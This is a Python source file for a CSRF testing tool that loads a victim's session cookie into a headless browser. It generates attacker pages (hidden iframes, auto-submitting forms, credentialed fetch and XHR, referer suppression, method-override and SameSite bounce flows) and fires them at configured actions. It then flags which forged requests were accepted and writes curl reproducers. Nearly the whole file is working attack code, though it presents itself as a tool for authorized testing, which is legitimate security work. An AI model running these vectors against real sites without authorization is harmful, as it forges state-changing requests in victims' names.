#!/usr/bin/env python3
# WebSentinel+ CSRF Suite — CLI (authorized testing only)

import argparse
import json
import os
from dataclasses import dataclass, field
from typing import Dict, Optional
from urllib.parse import urlparse

from playwright.sync_api import sync_playwright

from utils.url_utils import parse_domain, same_origin, same_path, build_query, data_url
from utils.report_writer import write_reports
from utils.audit import append_audit


@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str, str] = field(default_factory=dict)


@dataclass
class SessionCookie:
    name: str
    value: str
    domain: str
    path: str = "/"
    secure: bool = True
    httpOnly: bool = False
    sameSite: Optional[str] = None  # "Lax"|"Strict"|"None"|None


# PortSwigger-inspired scenarios + practical extras
VECTORS = [
    {"id": "img_get",               "kind": "GET_TAG",       "desc": "GET via <img>",                         "build": "tag"},
    {"id": "script_get",            "kind": "GET_TAG",       "desc": "GET via <script>",                      "build": "tag"},
    {"id": "iframe_get",            "kind": "GET_TAG",       "desc": "GET via <iframe>",                      "build": "tag"},
    {"id": "meta_refresh",          "kind": "GET_NAV",       "desc": "Top-level meta refresh",                "build": "meta"},
    {"id": "link_click",            "kind": "GET_NAV",       "desc": "Top-level auto-click link",             "build": "link"},
    {"id": "noreferrer_link",       "kind": "GET_NAV",       "desc": "Link with rel=noreferrer",              "build": "noreferrer"},
    {"id": "form_post",             "kind": "POST_FORM",     "desc": "Auto-submitting POST form",             "build": "form"},
    {"id": "fetch_post",            "kind": "POST_FETCH",    "desc": "JS fetch POST (cred=include)",          "build": "fetch"},
    {"id": "xhr_post_json",         "kind": "POST_JSON",     "desc": "XHR JSON POST (withCredentials)",       "build": "xhr_json"},
    {"id": "multipart_post",        "kind": "POST_MULTIPART","desc": "Multipart/form-data POST",              "build": "multipart"},
    {"id": "method_override_param", "kind": "GET_NAV",       "desc": "GET with _method=POST param",           "build": "method_param"},
    {"id": "cookie_refresh_then_post","kind":"SEQUENCE",     "desc": "Bounce then auto-POST",                 "build": "refresh_then_post"},
]


# --------------------- HTML builders for attacker pages ---------------------

def html_tag(url, tag):
    if tag == "img":
        return f'<img src="{url}">'
    if tag == "script":
        return f'<script src="{url}"></script>'
    if tag == "iframe":
        return f'<iframe src="{url}" style="display:none"></iframe>'
    return ""


def html_meta_refresh(url):
    return f'<meta http-equiv="refresh" content="0; url={url}">'


def html_link(url, noreferrer=False):
    rel = ' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>document.getElementById("go").click()</script>'


def html_form_post(action_url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in (params or {}).items()])
    return f'<form id="f" action="{action_url}" method="POST">{inputs}</form><script>document.getElementById("f").submit()</script>'


def html_fetch_post(action_url, params):
    from urllib.parse import urlencode
    body = urlencode(params or {})
    return f'<script>fetch("{action_url}",{{method:"POST",credentials:"include",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"{body}"}}).catch(()=>{{}})</script>'


def html_xhr_json(action_url, params):
    import json as _json
    js = _json.dumps(params or {})
    return f'<script>var x=new XMLHttpRequest();x.open("POST","{action_url}",true);x.withCredentials=true;x.setRequestHeader("Content-Type","application/json");x.send({js});</script>'


def html_multipart(action_url, params):
    inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in (params or {}).items()])
    return f'<form id="mf" action="{action_url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="file"></form><script>document.getElementById("mf").submit()</script>'


# --------------------- Classification & repro helpers ----------------------

def classify_exploit(vector_id, action_method, req_method, status, referer, origin, location_header):
    """
    Heuristics to label a forged request as 'exploited' (likely accepted):
      - status < 400
      - not redirected to login
      - for referer-bypass vector: missing Referer and still accepted
      - for method-bypass: GET accepted where action expects POST
    """
    if not status or int(status) >= 400:
        return False, "HTTP error"
    loc = (location_header or "").lower()
    if any(x in loc for x in ["/login", "signin", "log-in", "authenticate"]):
        return False, "Redirect to login"
    if vector_id == "noreferrer_link" and (referer is None):
        return True, "Accepted with no Referer"
    if action_method.upper() == "POST" and req_method == "GET":
        return True, "Accepted GET for state change"
    return True, "Accepted (status<400)"


def curl_for(action_url, req_method, params):
    from urllib.parse import urlencode
    if req_method == "GET":
        url = build_query(action_url, params or {})
        return f'curl -i "{url}"'
    body = urlencode(params or {})
    return f'curl -i -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "{body}" "{action_url}"'


# ------------------------------- Main runner --------------------------------

def run_suite(cfg_path: str, out_dir: str, exploits_only: bool = False):
    with open(cfg_path, "r", encoding="utf-8") as f:
        cfg = json.load(f)

    base_url = cfg["base_url"].rstrip("/")
    actions = [Action(**a) for a in cfg["actions"]]
    sc = cfg.get("session_cookie")
    optional = cfg.get("optional", {})
    use_noreferrer = bool(optional.get("noreferrer", False))
    bounce_url = optional.get("bounce_url")

    u = urlparse(base_url)
    target_origin = f"{u.scheme}://{u.hostname}" + (f":{u.port}" if u.port else "")

    results = []
    exploited_list = []

    def build_variant_urls(action: Action):
        get_url = build_query(action.url, action.params)
        meth_override = build_query(action.url, {**action.params, "_method": "POST"})
        return get_url, meth_override

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        # Ignore HTTPS errors (handy for labs), set shorter default timeouts
        ctx = browser.new_context(ignore_https_errors=True)
        page = ctx.new_page()
        page.set_default_timeout(7000)
        page.set_default_navigation_timeout(7000)

        # Load victim session cookie, if provided
        if sc:
            cookie = SessionCookie(**sc)
            ctx.add_cookies([{
                "name": cookie.name, "value": cookie.value, "domain": cookie.domain,
                "path": cookie.path, "secure": cookie.secure, "httpOnly": cookie.httpOnly,
                "sameSite": cookie.sameSite if cookie.sameSite in ("Lax", "Strict", "None") else None
            }])

        obs = []

        def on_request(req):
            try:
                if same_origin(req.url, target_origin):
                    hdrs = dict(req.headers)
                    obs.append({
                        "phase": "request",
                        "url": req.url,
                        "method": req.method,
                        "referer": hdrs.get("referer"),
                        "origin": hdrs.get("origin")
                    })
            except Exception:
                pass

        def on_response(resp):
            try:
                if same_origin(resp.url, target_origin):
                    obs.append({
                        "phase": "response",
                        "url": resp.url,
                        "status": resp.status,
                        "headers": dict(resp.headers)
                    })
            except Exception:
                pass

        page.on("request", on_request)
        page.on("response", on_response)

        # Optional SameSite 'cookie refresh' warmup
        if bounce_url:
            try:
                page.goto(bounce_url, wait_until="load")
                page.wait_for_timeout(800)
            except Exception:
                pass

        # Fire all vectors for each action
        for action in actions:
            get_url, method_override = build_variant_urls(action)

            vectors_to_fire = []
            for v in VECTORS:
                if v["build"] == "tag":
                    for tag in ("img", "script", "iframe"):
                        vectors_to_fire.append((f"{v['id']}:{tag}", html_tag(get_url, tag), "GET"))
                elif v["build"] == "meta":
                    vectors_to_fire.append((v["id"], html_meta_refresh(get_url), "GET"))
                elif v["build"] == "link":
                    vectors_to_fire.append((v["id"], html_link(get_url, False), "GET"))
                elif v["build"] == "noreferrer":
                    if use_noreferrer:
                        vectors_to_fire.append((v["id"], html_link(get_url, True), "GET"))
                elif v["build"] == "form":
                    vectors_to_fire.append((v["id"], html_form_post(action.url, action.params if action.method.upper() == "POST" else {}), "POST"))
                elif v["build"] == "fetch":
                    vectors_to_fire.append((v["id"], html_fetch_post(action.url, action.params if action.method.upper() == "POST" else {}), "POST"))
                elif v["build"] == "xhr_json":
                    vectors_to_fire.append((v["id"], html_xhr_json(action.url, action.params if action.method.upper() == "POST" else {}), "POST"))
                elif v["build"] == "multipart":
                    vectors_to_fire.append((v["id"], html_multipart(action.url, action.params if action.method.upper() == "POST" else {}), "POST"))
                elif v["build"] == "method_param":
                    vectors_to_fire.append((v["id"], html_link(method_override, False), "GET"))
                elif v["build"] == "refresh_then_post":
                    step1 = html_link(base_url, False)
                    step2 = html_form_post(action.url, action.params if action.method.upper() == "POST" else {})
                    vectors_to_fire.append((v["id"], step1 + "<hr/>" + step2, "POST"))

            for vec_id, html, exp_req_method in vectors_to_fire:
                before = len(obs)
                try:
                    # IMPORTANT: don't wait for full 'load' — just set content and let JS/tags fire
                    page.set_content(html, wait_until="domcontentloaded")
                    page.wait_for_timeout(1200)  # brief pause so fetch/XHR/resources fire

                    req_method, referer, origin, status, location = None, None, None, None, None
                    for ev in obs[before:]:
                        if ev["phase"] == "request" and same_path(ev["url"], action.url):
                            req_method, referer, origin = ev.get("method"), ev.get("referer"), ev.get("origin")
                        if ev["phase"] == "response" and same_path(ev["url"], action.url) and status is None:
                            status = ev.get("status")
                            headers = ev.get("headers") or {}
                            location = headers.get("location") or headers.get("Location")

                    exploited, why = classify_exploit(
                        vec_id,
                        action.method,
                        req_method or exp_req_method,
                        status,
                        referer,
                        origin,
                        location
                    )

                    row = {
                        "action": action.name,
                        "url": action.url,
                        "vector": vec_id,
                        "req_method": req_method or exp_req_method,
                        "status": status,
                        "referer": referer,
                        "origin": origin,
                        "exploited": exploited,
                        "note": (why
                                 + ("; Referer intentionally suppressed" if vec_id == "noreferrer_link" else "")
                                 + ("; SameSite Lax 'refresh' flow" if vec_id == "cookie_refresh_then_post" else "")
                                 + ("; Uses _method=POST" if vec_id == "method_override_param" else "")).strip("; ")
                    }

                    # Add a simple cURL reproducer for exploited vectors
                    if exploited:
                        row["curl"] = curl_for(action.url, row["req_method"], action.params)
                        exploited_list.append({"action": action.name, "vector": vec_id, "status": status})

                    results.append(row)

                except Exception as e:
                    results.append({
                        "action": action.name,
                        "url": action.url,
                        "vector": vec_id,
                        "req_method": exp_req_method,
                        "status": None,
                        "referer": None,
                        "origin": None,
                        "exploited": False,
                        "note": f"Error: {type(e).__name__}"
                    })

        browser.close()

    # Write full report
    json_out, html_out = write_reports(
        base_url,
        results,
        template_path=os.path.join("templates", "csrf_report.html"),
        out_dir=out_dir,
        domain=parse_domain(base_url),
        exploited=exploited_list
    )

    # Optionally write an exploits-only report and cURL repro list
    ex_json_out = ex_html_out = None
    if exploits_only:
        exploited_rows = [r for r in results if r.get("exploited")]
        ex_json_out, ex_html_out = write_reports(
            base_url,
            exploited_rows,
            template_path=os.path.join("templates", "csrf_report.html"),
            out_dir=out_dir,
            domain=parse_domain(base_url),
            exploited=exploited_list,
            filename_suffix="_exploited"
        )

    curls = [r["curl"] for r in results if r.get("exploited") and r.get("curl")]
    curl_path = None
    if curls:
        import time
        ts = time.strftime("%Y-%m-%d_%H-%M-%S")
        curl_path = os.path.join(out_dir, f"{parse_domain(base_url)}_csrf_{ts}_curl.txt")
        with open(curl_path, "w", encoding="utf-8") as f:
            f.write("# Repro cURL for exploited CSRF vectors\n")
            for c in curls:
                f.write(c + "\n")

    append_audit({
        "base_url": base_url,
        "json": json_out,
        "html": html_out,
        "json_exploits": ex_json_out,
        "html_exploits": ex_html_out,
        "curl_file": curl_path,
        "vectors": len(results),
        "exploited": len(exploited_list)
    })

    print("[+] CSRF suite completed")
    print(f"    JSON: {json_out}")
    print(f"    HTML: {html_out}")
    if ex_html_out:
        print(f"    Exploits-only HTML: {ex_html_out}")
    if curl_path:
        print(f"    cURL repro list: {curl_path}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="CSRF Attack Suite (authorized testing only)")
    ap.add_argument("--config", required=True, help="actions.json (base_url, session_cookie, actions[])")
    ap.add_argument("--out", default="reports", help="output folder")
    ap.add_argument("--exploits-only", action="store_true",
                    help="also write an exploits-only HTML/JSON report")
    args = ap.parse_args()

    run_suite(args.config, args.out, exploits_only=args.exploits_only)
